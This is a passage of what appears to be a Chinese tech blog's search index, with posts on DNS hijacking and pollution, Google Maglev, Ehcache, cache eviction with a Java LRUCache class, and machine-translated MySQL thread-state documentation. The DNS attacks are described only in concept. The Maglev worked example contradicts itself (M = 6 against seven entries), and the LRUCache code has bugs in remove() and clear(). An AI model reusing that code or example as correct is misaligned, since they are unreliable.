    <content type="text"><![CDATA[域名解析dns重定向存储:本地.阿里云.万网dns服务器 dns 在网络上其实就是域名解析到ip的一个过程叫dns解析 本站域名 www.wuxinvip.com 解析ip 为 39.107.82.228 {———-} 以此为例、过程 1、用户请求数据、发送域名到域名解析服务器 2、将域名发送到dns服务解析器【国外顶级域名dns服务器、万网dns服务器、阿里dns服务器】 一般你的域名在哪里买的 会有相应的dns解析服务器【免费提供】 当然这个解析的过程、请求会发到一个主机器、这个机器按照不同规则、将解析 分发个各个dns解析器、然后返回域名对应的外网ip地址 用户拿个这个ip 呼叫公网上叫这个ip的服务器 建立会话 域名攻击1234567891011121314 域名直接污染 域名间接污染域名直接污染: 在用户请求域名的ip地址途中、通过拦截域名解析、把ip指向别的服务器、 比如很普通的、当年百度网站被指向了一个荷兰的一个ip、这就是dns劫持攻击、简单暴力直接瘫痪你的网站 域名间接污染：这个就比较复杂了、dns解析服务器也是一个梯度服务器、上游将域名解析列表发送给下游服务器如果在上游服务器到下游服务器之间做一个拦截、那么将导致下游的dns解析全部错误、现在的google不能访问就是这个样子、所以有了各大host访问谷歌的功能、不过把google真正的ip解析放到自己的电脑里直接访问ip方式、也只能解决很小一部分墙问题、这些ip后续防火墙也会封掉的、这个就涉及到国家的网络与国际链接的国际出入口的防火墙上（像我天朝“G/.F/.W/.”）、基本上也算是最大的dns污染源]]></content>
      <categories>
        <category>java</category>
        <category>load-balance</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[maglev]]></title>
    <url>%2F2018%2F03%2F24%2Fload-balance%2Fmaglev%2F</url>
    <content type="text"><![CDATA[简介Google Maglev 是一个牛逼的负载均衡器，之所以牛逼，是因为它不用部署专门的物理设备，不像 LVS 一样工作在内核，它是运行在通用 Linux 服务器上的大型分布式软件系统。 Google Maglev 工作流程 每个 Google 服务都有一个或者多个 VIP，一个 VIP 和物理 IP 的区别在于 VIP 没有绑给某个特定的网卡。 VIP 注解Maglev 关联每个 VIP 到具体的 Endpoint，然后通过 BGP 将 VIP 宣告给上游路由器，然后路由器再把 VIP 宣告给 Google 的骨干网，这样使得 VIP 能被访问到。 {———-} 流程当用户访问 www.google.com 时： 浏览器先发送一个 DNS 请求， DNS 服务返回 VIP。 然后浏览器尝试与该 VIP 建立连接。 当路由器接收到 VIP 数据包，通过 ECMP 将数据包路由到 Maglev 集群中的某台机器上。 当 Maglev 的机器接收到数据包， 从关联到该 VIP 的 Endpoint 中选择一个， 然后用 GRE 封包发送，外层的 IP 即 Endpoint 的物理 IP。 当 Endpoint 处理完数据包进行响应时，源地址用 VIP 填充，目的地址为用户 IP。 使用直接服务返回(Direct Server Return， DSR) ，将响应直接发送给路由器， 这样 Maglev 无需处理响应包。 Google Maglev 结构”&gt;}} 结构Maglev 由控制器（Controller）和 转发器（Forwarder）组成： 控制器向路由器宣告 VIP。控制器周期性地检查转发器的健康状态，来宣告或者撤回 VIP。确保路由器只转发包到健康的 Magvel。 转发器转发 VIP 流量到 Endpoint。每个 VIP 都有一个后端池（BP），BP 可能包含 Endpoint 的 IP，也有可能包含其它 BP。每个 BP 会对 Endpoint 进行健康检查，保证数据包转发到健康的 Endpoint。 转发器的设计和实现 Google Maglev 转发器结构”&gt;}} 设计转发器直接从网卡接收数据包，通过 GRE/IP 封包，再将它们发回网卡。 Linux 内核不参与这个过程。 Steering 处理从 NIC（网卡）接收来的数据包，通过五元组（IP地址，源端口，目的IP地址，目的端口和传输层协议）哈希，然后交给不同的接收队列。 包重写线程从接收队列取包，然后进行后端选择，用 GRE 封包后，发送到传输队列。 Muxing 轮询从所有的传输队列取包，再发送给网卡。 Google Maglev 快速包处理”&gt;}} Maglev 在包处理时绕开了 Linux 内核，因为内核开销非常严重。 如图，转发器和网卡共用数据包池（Packet Pool），转发器中的 Steering 和 Muxing 都通过指针的环形队列，指向该池。 对于 Seering： 当网卡接收到数据包时，放在 Recieved 所指位置，并向前移动指针。 分发包到接收队列时，向前移动Processed 指针。 预留未使用数据包，放入队列中并向前移动 Reserved 指针。 对于 Muxing： 网卡将 Sent 所指的数据包发出去，并向前移动指针。 将被重写的数据包放入队列中，并向前移动 Ready 指针。 同时将已被发送的包归回给数据包池，并向前移动 Recycled 指针。 整个过程都没有包拷贝。 后端选择 Maglev首先检查本地的连接跟踪表，看看该数据包是否属于任何一个已有的连接，如果连接已经建立，则直接将数据包发到该连接对应的服务器上去。 如果连接没有建立，此时就需要一致性哈希函数选择一个后端服务器了，并添加到连接跟踪表。 Maglev 一致性哈希的基本思想就是： 有一个共享的Entry表，可以通过Entry[Hash % M]选择对应后端，M为Entry表大小。 每个后端对所有Entry表位置有自己的优先级排序，存在permutation表里。 所有的后端通过优先级顺序轮流填充Entry 中的空白位置，直至填满。每次都填充自己优先级最高的空位置。例如，假设M = 6，且12345678910111213141516B0: permutation[] = &#123; 3, 0, 4, 1, 5, 2, 6 &#125;B1: permutation[] = &#123; 0, 2, 4, 6, 1, 3, 5 &#125;B2: permutation[] = &#123; 3, 4, 5, 6, 0, 1, 2 &#125;permutation优先级是从大到小，那么最后填充后的Entry表为：Entry[] = &#123; B1, B0, B1, B0, B2, B2, B0 &#125;说明：B0 的优先级最高的位置是Entry[3]，其为空，则Entry[3] = B0。B1 是Entry[0]，则Entry[0]=B1。B2 是Entry[3]，但是已被占，下一个是Entry[4]，为空，则Entry[4]=B2。以此类推，直至填满。 操作经验 Google Maglev VIP 匹配”&gt;}} 有时候，我们需要利用 Maglev 封包将流量重定向到其他的集群中的相同服务，这就有点麻烦了，因为集群间是独立的，我们不知道其它集群相同服务的 VIP。 VIP 可以通过最长前缀匹配，来决定集群，利用最长后缀匹配决定那个后端池。 如图中的例子，当请求 173.194.71.1 时，通过最长前缀（173.194.71.0/24）选择 C2 集群，通过最长后缀（0.0.0.1/8）决定是 Service 1 后端池。 假定 Maglev 需要将流量转发到 C3（173.194.72.0/24），只需要用相同的后缀构造出 VIP （173.194.72.1）进行转发，即可转发到 Maglev 的 Service 1 后端池。 分片处理 分片时，非首个分片只包含三元组（目的IP地址，目的端口和传输层协议），这便无法正确决定如何转发，因为转发根据的是五元组。 解决方法是： 每个 Maglev 配置了一个特殊的后端池，包含所有的 Maglev 机器。 一旦接收到分片， Maglev 用三元组哈希选择特定的 Maglev 作为后端进行转发，将它们重定向给相同的 Maglev。 Maglev 为未分片数据包和第二跳的首分片使用相同的后端决策算法，以保证非分片、首个分片和非首个分片选择同一个后端。 Magelv 维护了一个固定大小的分片表，记录了首分片的转发决策。 当 Maglev 收到一个第二跳非首分片， 会从分片表中查找，若匹配则立即转发； 否则，会缓存到分片表中，直到首分片收到或者老化。 转载地址]]></content>
      <categories>
        <category>java</category>
        <category>load-balance</category>
      </categories>
      <tags>
        <tag>负载均衡</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ehcache]]></title>
    <url>%2F2018%2F03%2F24%2Fcache%2Fehcache%2F</url>
    <content type="text"><![CDATA[ehcache service层缓存系统 发展史 Ehcache 开发者（S） Terracotta，Inc。[1] 稳定版本 3.3.0 / 2017年2月1日; 16个月前 写入 Java的 操作系统 跨平台 类型 高速缓存 执照 Apache许可证 2.0 网站 www.ehcache.org Ehcache是一个开源的Java 分布式缓存，用于通用缓存，Java EE和轻量级容器[ 澄清 ]。[2] Ehcache在Apache开源许可下可用。[1] Ehcache由Greg Luck于2003年开发。2009年，该项目由Terracotta购买，后者提供付费支持。 该软件仍然是开源软件，但一些新的主要功能（Fast Restartability Consistency）仅适用于Enterprise Ehcache和BigMemory等非开源的商业产品。 2011年3月，维基媒体基金会宣布将使用Ehcache来改善其维基项目的性能。[3]然而，在测试显示该方法的问题后，这很快就被放弃了。]]></content>
      <categories>
        <category>java</category>
        <category>cache</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓存淘汰算法]]></title>
    <url>%2F2018%2F03%2F24%2Fcache%2Fcache-elimination-algorithm%2F</url>
    <content type="text"><![CDATA[常见算法:LRULRU-K2QMQ 缓存淘汰算法12345678910111213缓存分析三大要点： 命中率、复杂度、代价LRU 最近最少使用算法FIFO 先入先出算法MRU 最近最常使用算法FIFO 先进先出 LFU 最少使用算法 LFU（Least Frequently Used）最近最少使用算法。它是基于“如果一个数据在最近一段时间内使用次数很少，那么在将来一段时间内被使用的可能性也很小”的思路。LRU LRU全称是Least Recently Used，即最近最久未使用的意思注意LFU和LRU算法的不同之处，LRU的淘汰规则是基于访问时间，而LFU是基于访问次数的。 {———-} 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142/** * Created by huoyan403 on 2017/8/16. * * 这个类也被Tomcat所使用（ org.apache.tomcat.util.collections.LRUCache），但是在tomcat6.x版本中，已经被弃用，使用另外其他的缓存类来替代它。 */public class LRUCache &#123; private int cacheSize; private Hashtable nodes;//缓存容器 private int currentSize; private CacheNode first;//链表头 private CacheNode last;//链表尾 /** * 链表节点 * @author Administrator * */ class CacheNode &#123; CacheNode prev;//前一节点 CacheNode next;//后一节点 Object value;//值 Object key;//键 CacheNode() &#123; &#125; &#125; public LRUCache(int i) &#123; currentSize = 0; cacheSize = i; nodes = new Hashtable(i);//缓存容器 &#125; /** * 获取缓存中对象 * @param key * @return */ public Object get(Object key) &#123; CacheNode node = (CacheNode) nodes.get(key); if (node != null) &#123; moveToHead(node); return node.value; &#125; else &#123; return null; &#125; &#125; /** * 添加缓存 * @param key * @param value */ public void put(Object key, Object value) &#123; CacheNode node = (CacheNode) nodes.get(key); if (node == null) &#123; //缓存容器是否已经超过大小. if (currentSize &gt;= cacheSize) &#123; if (last != null)//将最少使用的删除 nodes.remove(last.key); removeLast(); &#125; else &#123; currentSize++; &#125; node = new CacheNode(); &#125; node.value = value; node.key = key; //将最新使用的节点放到链表头，表示最新使用的. moveToHead(node); nodes.put(key, node); &#125; /** * 将缓存删除 * @param key * @return */ public Object remove(Object key) &#123; CacheNode node = (CacheNode) nodes.get(key); if (node != null) &#123; if (node.prev != null) &#123; node.prev.next = node.next; &#125; if (node.next != null) &#123; node.next.prev = node.prev; &#125; if (last == node) last = node.prev; if (first == node) first = node.next; &#125; return node; &#125; public void clear() &#123; first = null; last = null; &#125; /** * 删除链表尾部节点 * 表示 删除最少使用的缓存对象 */ private void removeLast() &#123; //链表尾不为空,则将链表尾指向null. 删除连表尾（删除最少使用的缓存对象） if (last != null) &#123; if (last.prev != null) last.prev.next = null; else first = null; last = last.prev; &#125; &#125; /** * 移动到链表头，表示这个节点是最新使用过的 * @param node */ private void moveToHead(CacheNode node) &#123; if (node == first) return; if (node.prev != null) node.prev.next = node.next; if (node.next != null) node.next.prev = node.prev; if (last == node) last = node.prev; if (first != null) &#123; node.next = first; first.prev = node; &#125; first = node; node.prev = null; if (last == null) last = first; &#125;&#125;]]></content>
      <categories>
        <category>java</category>
        <category>cache</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL优化【线程信息检查】]]></title>
    <url>%2F2018%2F03%2F24%2Fmysql%2Foptimization-sql-thread%2F</url>
    <content type="text"><![CDATA[8.14.1线程命令值 8.14.2一般线程状态 8.14.3查询缓存线程状态 8.14.4复制主线程状态 8.14.5复制从站I / O线程状态 8.14.6复制从属SQL线程状态 8.14.7复制从站连接线程状态 8.14.8 NDB集群线程状态 8.14.9事件调度程序线程状态 {———-} 当您试图确定MySQL服务器正在做什么时，检查进程列表会很有帮助，进程列表是当前在服务器中执行的线程集。可从以下来源获取流程列表信息： 该SHOW [FULL] PROCESSLIST语句： 第13.7.5.29，“SHOW PROCESSLIST语法” 该SHOW PROFILE语句： 第13.7.5.31，“显示配置文件语法” 该INFORMATION_SCHEMA PROCESSLIST表： 第24.17，“该INFORMATION_SCHEMA PROCESSLIST表” 在中mysqladmin processlist的命令： 第4.5.2节“ 中mysqladmin -客户端管理MySQL服务器” 性能模式threads 表，阶段表和锁定表： 第25.11.16节“性能模式杂项表”， 第25.11.5节“性能模式阶段事件表”， 第25.11.12节“性能模式锁定表”。 该sys架构 processlist视图，呈现从性能架构信息 threads表中更方便的格式：第26.4.3.22，“ProcessList中和X $ PROCESSLIST意见” 该sys架构 session视图，其中介绍有关用户会话的信息（如 sys架构 processlist视图，但是过滤掉后台进程）： 第26.4.3.33，“会议和X $会话视图” 访问threads不需要互斥锁，对服务器性能的影响最小。 INFORMATION_SCHEMA.PROCESSLIST并且SHOW PROCESSLIST因为它们需要互斥锁而 产生负面的性能影响。 threads还显示有关后台线程的信息，有哪些 INFORMATION_SCHEMA.PROCESSLIST， SHOW PROCESSLIST有时没有。这意味着threads可以用来监视其他线程信息源不能的活动。 您始终可以查看有关自己的线程的信息。要查看有关正在为其他帐户执行的线程的信息，您必须具有该PROCESS权限。 每个进程列表条目包含几条信息： Id 是与线程关联的客户端的连接标识符。 User并Host指明与该线程关联的帐户。 db是线程的默认数据库，或者NULL如果没有选择。 Command并State 指出线程正在做什么。 大多数州对应于非常快速的操作。如果一个线程停留在给定状态很多秒，则可能存在需要调查的问题。 Time表示线程处于当前状态的时间。在某些情况下，线程的当前时间概念可能会改变：线程可以改变时间。对于正在处理来自主站的事件的从站上运行的线程，线程时间设置为在事件中找到的时间，因此反映了主站而不是从站的当前时间。 SET TIMESTAMP = value Info包含线程正在执行的语句的文本，或者NULL它是否正在执行。默认情况下，此值仅包含语句的前100个字符。要查看完整的语句，请使用 SHOW FULL PROCESSLIST。 以下部分列出了可能的 Command值以及State 按类别分组的值。其中一些价值观的含义是不言而喻的。对于其他人，提供了另外的描述。 8.14.1线程命令值线程可以具有以下任何 Command值： Binlog Dump 这是主服务器上的一个线程，用于将二进制日志内容发送到从属服务器。 Change user 线程正在执行更改用户操作。 Close stmt 线程正在关闭准备好的声明。 Connect 复制从站连接到其主站。 Connect Out 复制从站正在连接到其主站。 Create DB 线程正在执行create-database操作。 Daemon 此线程是服务器的内部线程，而不是为客户端连接提供服务的线程。 Debug 该线程正在生成调试信息。 Delayed insert 该线程是一个延迟插入处理程序。 Drop DB 该线程正在执行drop-database操作。 Error Execute 线程正在执行预准备语句。 Fetch 该线程正在从执行预准备语句中获取结果。 Field List 该线程正在检索表列的信息。 Init DB 该线程正在选择默认数据库。 Kill 该线程正在杀死另一个线程。 Long Data 线程正在检索执行预准备语句的结果中的长数据。 Ping 该线程正在处理服务器ping请求。 Prepare 线程正在准备一份准备好的声明。 Processlist 该线程正在生成有关服务器线程的信息。 Query 线程正在执行一个语句。 Quit 线程正在终止。 Refresh 该线程正在刷新表，日志或缓存，或重置状态变量或复制服务器信息。 Register Slave 线程正在注册从服务器。 Reset stmt 该线程正在重置准备好的语句。 Set option 该线程正在设置或重置客户端语句执行选项。 Shutdown 该线程正在关闭服务器。 Sleep 线程正在等待客户端向其发送新语句。 Statistics 该线程正在生成服务器状态信息。 Table Dump 线程正在将表内容发送到从属服务器。 Time 没用过。 8.14.2一般线程状态以下列表描述了State 与常规查询处理相关联的线程值，而不是更复杂的特殊活动。其中许多仅用于查找服务器中的错误。 After create 当线程在创建表的函数末尾创建表（包括内部临时表）时，会发生这种情况。即使由于某些错误而无法创建表，也会使用此状态。 Analyzing 线程正在计算MyISAM表键分布（例如，for ANALYZE TABLE）。 checking permissions 线程正在检查服务器是否具有执行该语句所需的权限。 Checking table 该线程正在执行表检查操作。 cleaning up 该线程已经处理了一个命令，并准备释放内存并重置某些状态变量。 closing tables 该线程正在将更改的表数据刷新到磁盘并关闭已使用的表。这应该是一个快速的操作。如果没有，请验证您没有完整磁盘并且磁盘使用不是很大。 converting HEAP to ondisk 该线程正在将内部临时表从 MEMORY表转换为磁盘表。 copy to tmp table 线程正在处理一个ALTER TABLE语句。这种状态发生在创建新结构的表之后，但在将行复制到其中之前。 对于处于此状态的线程，可以使用性能模式来获取有关复制操作的进度。请参见 第25.11.5节“性能模式阶段事件表”。 Copying to group table 如果语句具有不同ORDER BY和 GROUP BY标准，各行按组排列和复制到一个临时表。 Copying to tmp table 服务器正在复制到内存中的临时表。 altering table 服务器正在执行就地 ALTER TABLE。 Copying to tmp table on disk 服务器正在复制到磁盘上的临时表。临时结果集变得太大（请参见 第8.4.4节“MySQL中的内部临时表使用”）。因此，线程正在将临时表从内存更改为基于磁盘的格式以节省内存。 Creating index 线程正在处理ALTER TABLE … ENABLE KEYS一个MyISAM表。 Creating sort index 线程正在处理SELECT使用内部临时表解析的线程 。 creating table 线程正在创建一个表。这包括创建临时表。 Creating tmp table 该线程正在内存或磁盘上创建临时表。如果表在内存中创建但稍后转换为磁盘表，则该操作期间的状态将为Copying to tmp table on disk。 committing alter table to storage engine 服务器已就地完成 ALTER TABLE并正在提交结果。 deleting from main table 服务器正在执行多表删除的第一部分。它仅从第一个表中删除，并保存用于从其他（引用）表中删除的列和偏移量。 deleting from reference tables 服务器正在执行多表删除的第二部分，并从其他表中删除匹配的行。 discard_or_import_tablespace 线程正在处理ALTER TABLE … DISCARD TABLESPACE或ALTER TABLE … IMPORT TABLESPACE声明。 end 这发生在结束，但的清理之前 ALTER TABLE， CREATE VIEW， DELETE， INSERT， SELECT，或 UPDATE语句。 executing 线程已开始执行语句。 Execution of init_command 线程正在执行init_command系统变量值中的语句 。 freeing items 线程执行了一个命令。在此状态期间完成的一些项目的释放涉及查询缓存。这种状态通常紧随其后cleaning up。 FULLTEXT initialization 服务器正准备执行自然语言全文搜索。 init 出现这种情况的初始化之前 ALTER TABLE， DELETE， INSERT， SELECT，或 UPDATE语句。服务器在此状态下采取的操作包括刷新二进制日志，InnoDB日志和一些查询缓存清理操作。 对于end州，可能会发生以下操作： 删除表中的数据后删除查询缓存条目 将事件写入二进制日志 释放内存缓冲区，包括blob Killed 有人KILL 向线程发送了一个语句，它应该在下次检查kill标志时中止。在MySQL中的每个主循环中检查该标志，但在某些情况下，线程可能仍然需要很短的时间才能死掉。如果线程被某个其他线程锁定，则一旦另一个线程释放其锁定，kill就会生效。 logging slow query 该线程正在向慢查询日志写一条语句。 login 连接线程的初始状态，直到客户端成功通过身份验证。 manage keys 服务器正在启用或禁用表索引。 NULL 该状态用于该SHOW PROCESSLIST状态。 Opening tables 该线程正在尝试打开一个表。这应该是非常快的程序，除非有什么东西阻止打开。例如，一个ALTER TABLE或一个 LOCK TABLE语句可以阻止在语句结束之前打开表。还值得检查您的table_open_cache价值是否足够大。 optimizing 服务器正在对查询执行初始优化。 preparing 在查询优化期间发生此状态。 Purging old relay logs 该线程正在删除不需要的中继日志文件。 query end 处理查询后但在freeing items状态之前发生此 状态。 Receiving from client 服务器正在从客户端读取数据包。Reading from net在MySQL 5.7.8之前调用此状态。 Removing duplicates 该查询使用 SELECT DISTINCT的方式是MySQL无法在早期阶段优化掉不同的操作。因此，在将结果发送到客户端之前，MySQL需要额外的阶段来删除所有重复的行。 removing tmp table 该线程在处理SELECT 语句后删除内部临时表。如果未创建临时表，则不使用此状态。 rename 该线程正在重命名一个表。 rename result table 线程正在处理一个ALTER TABLE语句，创建了新表，并重命名它以替换原始表。 Reopen tables 线程获得了表的锁定，但在获取锁定后注意到基础表结构发生了变化。它释放了锁，关闭了桌子，并试图重新打开它。 Repair by sorting 修复代码使用排序来创建索引。 preparing for alter table 服务器正准备执行就地 ALTER TABLE。 Repair done 该线程已完成对MyISAM表的多线程修复 。 Repair with keycache 修复代码通过密钥缓存逐个创建密钥。这比慢得多Repair by sorting。 Rolling back 该线程正在回滚一个事务。 Saving state 对于MyISAM诸如修复或分析的表操作，线程将新表状态保存到.MYI文件头。State包括诸如行数， AUTO_INCREMENT计数器和密钥分发之类的信息。 Searching rows for update 该线程正在进行第一阶段以在更新之前查找所有匹配的行。如果 UPDATE要更改用于查找所涉及行的索引，则必须执行此操作。 Sending data 线程正在读取和处理SELECT语句的行 ，并将数据发送到客户端。由于在此状态期间发生的操作往往会执行大量磁盘访问（读取），因此它通常是给定查询生命周期中运行时间最长的状态。 Sending to client 服务器正在将数据包写入客户端。Writing to net在MySQL 5.7.8之前调用此状态。 setup 线程正在开始一个ALTER TABLE操作。 Sorting for group 线程正在进行排序以满足a GROUP BY。 Sorting for order 线程正在进行排序以满足ORDER BY。 Sorting index 线程正在对索引页进行排序，以便在MyISAM表优化操作期间进行更有效的访问。 Sorting result 对于SELECT声明，这类似于Creating sort index非临时表。 statistics 服务器正在计算统计信息以开发查询执行计划。如果线程长时间处于此状态，则服务器可能是磁盘绑定执行其他工作。 System lock 线程已调用mysql_lock_tables() ，并且线程状态尚未更新。这是一个非常普遍的状态，可能由于许多原因而发生。 例如，线程将要求或正在等待表的内部或外部系统锁定。InnoDB在执行期间等待表级锁定时会 发生这种情况LOCK TABLES。如果此状态是由外部锁的请求引起的，并且您没有使用多个访问相同 表的mysqld服务器，则MyISAM可以使用该–skip-external-locking 选项禁用外部系统锁 。但是，默认情况下禁用外部锁定，因此该选项很可能无效。对于 SHOW PROFILE，这个状态意味着线程正在请求锁定（不等待它）。 update 线程正准备开始更新表。 Updating 线程正在搜索要更新的行并正在更新它们。 updating main table 服务器正在执行多表更新的第一部分。它仅更新第一个表，并保存用于更新其他（引用）表的列和偏移量。 updating reference tables 服务器正在执行多表更新的第二部分，并更新其他表中的匹配行。 User lock 该线程将要求或正在等待通过GET_LOCK()呼叫请求的咨询锁 。对于 SHOW PROFILE，此状态表示线程正在请求锁定（不等待它）。 User sleep 该线程已经调用了一个 SLEEP()调用。 Waiting for commit lock FLUSH TABLES WITH READ LOCK 正在等待提交锁定。 Waiting for global read lock FLUSH TABLES WITH READ LOCK 正在等待全局读锁定或read_only正在设置全局 系统变量。 Waiting for tables 该线程得到一个通知，表明表的底层结构已经改变，它需要重新打开表以获得新结构。但是，要重新打开表，它必须等到所有其他线程关闭了相关表。 该通知发生如果另一个线程已使用 FLUSH TABLES或有问题的表下面的语句之一： ， ， ， ， ，或 。 FLUSH TABLES tbl_nameALTER TABLERENAME TABLEREPAIR TABLEANALYZE TABLEOPTIMIZE TABLE Waiting for table flush 线程正在执行FLUSH TABLES并正在等待所有线程关闭它们的表，或者线程得到一个表的基础结构已经更改的通知，并且需要重新打开表以获取新结构。但是，要重新打开表，它必须等到所有其他线程关闭了相关表。 该通知发生如果另一个线程已使用 FLUSH TABLES或有问题的表下面的语句之一： ， ， ， ， ，或 。 FLUSH TABLES tbl_nameALTER TABLERENAME TABLEREPAIR TABLEANALYZE TABLEOPTIMIZE TABLE Waiting for lock_type lock 服务器正在等待THR_LOCK从元数据锁定子系统获取 锁定或锁定，其中 lock_type指示锁定的类型。 此状态表示等待 THR_LOCK： Waiting for table level lock 这些状态表示等待元数据锁定： Waiting for event metadata lock Waiting for global read lock Waiting for schema metadata lock Waiting for stored function metadata lock Waiting for stored procedure metadata lock Waiting for table metadata lock Waiting for trigger metadata lock 有关表锁指示器的信息，请参见 第8.11.1节“内部锁定方法”。有关元数据锁定的信息，请参见第8.11.4节“元数据锁定”。要查看哪些锁阻止了锁请求，请使用 第25.11.12节“性能模式锁表”中所述的性能模式锁表。 Waiting on cond 线程正在等待条件变为真的通用状态。没有具体的州信息。 Writing to net 服务器正在将数据包写入网络。Sending to client从MySQL 5.7.8开始调用此状态。 8.14.3查询缓存线程状态这些线程状态与查询缓存相关联（请参见 第8.10.3节“MySQL查询缓存”）。 checking privileges on cached query 服务器正在检查用户是否具有访问缓存查询结果的权限。 checking query cache for query 服务器正在检查查询缓存中是否存在当前查询。 invalidating query cache entries 查询缓存条目被标记为无效，因为基础表已更改。 sending cached result to client 服务器从查询缓存中获取查询结果并将其发送到客户端。 storing result in query cache 服务器将查询结果存储在查询缓存中。 Waiting for query cache lock 在会话等待获取查询缓存锁定时发生此状态。对于需要执行某些查询缓存操作的任何语句，例如 使查询缓存无效INSERT或 查找缓存条目 DELETE的语句，等等，都会发生这种情况。 SELECTRESET QUERY CACHE 8.14.4复制主线程状态以下列表显示了您可能在State主Binlog Dump线程的列中 看到的最常见状态。如果Binlog Dump在主服务器上看不到任何 线程，则表示复制未运行; 也就是说，当前没有连接任何奴隶。 Finished reading one binlog; switching to next binlog 线程已经读完二进制日志文件并打开下一个发送给从属的文件。 Master has sent all binlog to slave; waiting for more updates 该线程已从二进制日志中读取所有剩余更新并将其发送给从属。该线程现在处于空闲状态，等待主事件上发生的新更新导致二进制日志中出现新事件。 Sending binlog event to slave 二进制日志由事件组成，其中事件通常是更新以及一些其他信息。线程已从二进制日志中读取事件，现在将其发送给从站。 Waiting to finalize termination 线程停止时发生的非常短暂的状态。 8.14.5复制从站I / O线程状态以下列表显示了在State从属服务器I / O线程的列中看到的最常见状态 。此状态也出现在Slave_IO_State 显示的列中SHOW SLAVE STATUS，因此您可以通过使用该语句很好地了解正在发生的情况。 Checking master version 在建立与主站的连接之后非常短暂地发生的状态。 Connecting to master 线程正在尝试连接到主服务器。 Queueing master event to the relay log 线程已读取事件并将其复制到中继日志，以便SQL线程可以处理它。 Reconnecting after a failed binlog dump request 线程正在尝试重新连接到主服务器。 Reconnecting after a failed master event read 线程正在尝试重新连接到主服务器。当再次建立连接时，状态变为 Waiting for master to send event。 Registering slave on master 建立与主站连接后非常短暂发生的状态。 Requesting binlog dump 在建立与主站的连接之后非常短暂地发生的状态。线程从请求的二进制日志文件名和位置开始向主机发送对其二进制日志内容的请求。 Waiting for its turn to commit slave_preserve_commit_order 启用 了从属线程等待较旧的工作线程提交时发生的状态 。 Waiting for master to send event 线程已连接到主服务器并正在等待二进制日志事件到达。如果主站空闲，这可能会持续很长时间。如果等待持续 slave_net_timeout几秒钟，则发生超时。此时，线程认为连接被破坏并尝试重新连接。 Waiting for master update 之前的初始状态Connecting to master。 Waiting for slave mutex on exit 线程停止时短暂发生的状态。 Waiting for the slave SQL thread to free enough relay log space 您使用的是非零 relay_log_space_limit 值，并且中继日志已经增长到足以使其组合大小超过此值。I / O线程正在等待，直到SQL线程通过处理中继日志内容释放足够的空间，以便它可以删除一些中继日志文件。 Waiting to reconnect after a failed binlog dump request 如果二进制日志转储请求失败（由于断开连接），则线程在休眠时进入此状态，然后尝试定期重新连接。可以使用CHANGE MASTER TO语句指定重试之间的间隔 。 Waiting to reconnect after a failed master event read 读取时发生错误（由于断开连接）。CHANGE MASTER TO在尝试重新连接之前，线程正在休眠该语句设置的秒数 （默认为60）。 8.14.6复制从属SQL线程状态以下列表显示了您可能在State从属服务器SQL线程列中看到的最常见状态： Killing slave 线程正在处理一个STOP SLAVE 语句。 Making temporary file (append) before replaying LOAD DATA INFILE 线程正在执行一个 LOAD DATA INFILE语句，并将数据附加到一个临时文件中，该文件包含从属将从中读取行的数据。 Making temporary file (create) before replaying LOAD DATA INFILE 线程正在执行一个 LOAD DATA INFILE语句，并且正在创建一个临时文件，其中包含从属将从中读取行的数据。只有在LOAD DATA INFILE运行早于5.0.3版本的MySQL版本的主机记录原始语句时，才会遇到此状态 。 Reading event from the relay log 线程已从中继日志中读取事件，以便可以处理事件。 Slave has read all relay log; waiting for more updates 该线程已处理中继日志文件中的所有事件，现在正在等待I / O线程将新事件写入中继日志。 Waiting for an event from Coordinator 使用多线程从属（slave_parallel_workers大于1），其中一个从属工作线程正在等待来自协调器线程的事件。 Waiting for slave mutex on exit 线程停止时发生的非常短暂的状态。 Waiting for Slave Workers to free pending events 当Workers正在处理的事件的总大小超过slave_pending_jobs_size_max 系统变量的大小时，会发生此等待操作 。当大小低于此限制时，协调器将恢复计划。仅当slave_parallel_workers设置大于0 时才会出现此状态 。 Waiting for the next event in relay log 之前的初始状态Reading event from the relay log。 Waiting until MASTER_DELAY seconds after master executed event SQL线程已读取一个事件，但正在等待从属延迟失效。此延迟通过 MASTER_DELAY选项设置 CHANGE MASTER TO。 InfoSQL线程 的列也可以显示语句的文本。这表明线程已从中继日志中读取事件，从中提取语句，并可能正在执行它。 8.14.7复制从站连接线程状态这些线程状态出现在复制从属服务器上，但与连接线程相关联，而不是与I / O或SQL线程相关联。 Changing master 线程正在处理一个CHANGE MASTER TO语句。 Killing slave 线程正在处理一个STOP SLAVE 语句。 Opening master dump table 此状态发生在Creating table from master dump。 Reading master dump table data 此状态发生在Opening master dump table。 Rebuilding the index on master dump table 此状态发生在Reading master dump table data。 8.14.8 NDB集群线程状态Committing events to binlog Opening mysql.ndb_apply_status Processing events 该线程正在处理二进制日志记录的事件。 Processing events from schema table 该线程正在进行模式复制的工作。 Shutting down Syncing ndb table schema operation and binlog 这用于为NDB提供正确的模式操作二进制日志。 Waiting for allowed to take ndbcluster global schema lock 线程正在等待获取全局模式锁的权限。 Waiting for event from ndbcluster 服务器充当NDB群集中的SQL节点，并连接到群集管理节点。 Waiting for first event from ndbcluster Waiting for ndbcluster binlog update to reach current position Waiting for ndbcluster global schema lock 线程正在等待另一个线程持有的全局模式锁定被释放。 Waiting for ndbcluster to start Waiting for schema epoch 线程正在等待架构时期（即全局检查点）。 8.14.9事件调度程序线程状态这些状态发生在Event Scheduler线程，为执行调度事件而创建的线程或终止调度程序的线程中。 Clearing 调度程序线程或正在执行事件的线程正在终止并即将结束。 Initialized 调度程序线程或将执行事件的线程已初始化。 Waiting for next activation 调度程序具有非空事件队列，但下一次激活是将来的。 Waiting for scheduler to stop 线程已发出SET GLOBAL event_scheduler=OFF并正在等待调度程序停止。 Waiting on empty queue 调度程序的事件队列为空并且正在休眠。]]></content>
      <categories>
        <category>java</category>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>SQL优化</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[memcached]]></title>
    <url>%2F2018%2F03%2F24%2Fcache%2Fmemcached%2F</url>
